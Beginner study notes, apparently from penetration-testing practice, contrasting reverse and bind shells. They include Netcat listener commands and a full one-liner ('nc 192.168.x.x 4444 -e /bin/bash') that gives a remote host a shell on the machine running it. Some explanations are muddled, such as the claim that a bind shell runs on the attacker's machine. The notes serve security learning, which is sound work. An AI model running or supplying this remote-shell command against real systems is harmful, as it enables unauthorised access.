Reverse Vs Bind Shells

Shell is Nothing but access to an machine 

So basically There are two types of shells 
1. Reverse Shell
2. Bind Shell 
So , lets dive in and lets find some basic differences between the two . 

Reverse shell

-> In this Victim Connects to us 
-> All we going to do with the reverse shell is going to listen 
-> we generally listen to the connection using Netcat 

Bind Shell 

-> In bind shell we open up a port on the target machine and then we connect to it. 

-> we send an exploit the target machine and then that exploit open a port on the target machine 
-> Then , We connect to that machine through that open port which was opened by the Exploit 
-> Then a shell is executed on the attackers machine and we get access to the machine 



-> Netcat command for listening on a port 
	-> nc -lvp 4444
	->nc -nlvp 4444 ( I usually prefer this one) 
-> Netcat command to connect to a machine on a port and get a shell 
	-> nc 192.168.x.x 4444 -e /bin/bash 
		or you can write "sh" instead of bash
